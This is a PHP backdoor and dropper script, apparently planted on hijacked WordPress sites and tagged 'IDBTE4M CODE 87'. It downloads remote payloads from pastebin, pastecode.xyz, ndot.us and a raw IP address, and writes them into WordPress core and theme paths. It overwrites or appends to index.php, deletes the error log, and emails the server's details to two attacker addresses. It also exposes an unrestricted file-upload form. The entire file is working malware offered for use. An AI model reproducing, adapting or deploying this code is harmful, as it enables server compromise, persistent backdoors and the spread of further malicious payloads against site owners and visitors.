<?php
ignore_user_abort(true);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('max_execution_time',0);
ini_set('memory_limit', '64M');
$sys = php_uname();
$lihat = getcwd();
$home = $_SERVER['DOCUMENT_ROOT'];
$domen = $_SERVER['SERVER_NAME'];
$tempat = $_SERVER['REQUEST_URI'];
$nama='ciki.php';
$ambil=file_get_contents('https://pastecode.xyz/view/raw/bde14432');
$dir=getcwd().DIRECTORY_SEPARATOR;
$buka=fopen('$dir/$nama','w');  
$sex=fwrite($buka,$ambil);
	if($sex)
	{
	}
	else {
	}
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}
$check1 = $home . '/wp-includes/js/include.php' ;
$text1 = http_get('http://ndot.us/za');
$open1 = fopen($check1, 'w');
fwrite($open1, $text1);
fclose($open1);
if(file_exists($check1)){
}
$check2 = $home . '/wp-content/themes/themes.php' ;
$text2 = http_get('https://pastecode.xyz/view/raw/c0dddc12');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
}
$check3 = $home . '/wp-config-sample.php';
$text3 = http_get('https://pastecode.xyz/view/raw/86ded0b5');
$open3 = fopen($check3, 'w');
fwrite($open3, $text3);
fclose($open3);
if(file_exists($check3)){
}
$check21 = $home . '/index2.php';
$text21 = http_get('https://pastebin.com/raw/fTW3kMYT');
$open21 = fopen($check21, 'w');
fwrite($open21, $text21);
fclose($open21);
if(file_exists($check21)){
}
$mailer = $home . '/index.php';
$ambil = http_get('https://pastebin.com/raw/fJvQSbPY');
$buka = fopen($mailer, 'a+');
fwrite($buka, $ambil);
fclose($buka);
if(file_exists($mailer)){
}
$filename='index.php';
$fget=file_get_contents('http://132.232.113.243/wget/index.txt');
$root=getcwd().DIRECTORY_SEPARATOR;
$fileopen=fopen('$root/$filename','w');  
$execfile=fwrite($fileopen,$fget);
	if($execfile)
	{
	}
	else {
	}
$filename2='matamu.php';
$fget2=file_get_contents('http://ndot.us/za');
$root2=getcwd().DIRECTORY_SEPARATOR;
$fileopen2=fopen('$root2/$filename2','w');  
$execfile2=fwrite($fileopen2,$fget2);
	if($execfile2)
	{
	}
	else {
	}
unlink('error_log');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'idb.code87@yahoo.com,jembot.kisut@gmail.com';
$x_path = "http://" . $domen . "/wp-includes/js/include.php\nhttp://" . $domen . $tempat . "\r\n" . $lihat;
mail($tujuanmail, $sys, $x_path);
echo '<center><h1>IDBTE4M CODE 87</h1>'.'<br>'.'[uname] '.php_uname().' [/uname] <br> Posisi : '.$cwd = getcwd(); Echo '<br><br><center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; }
?>
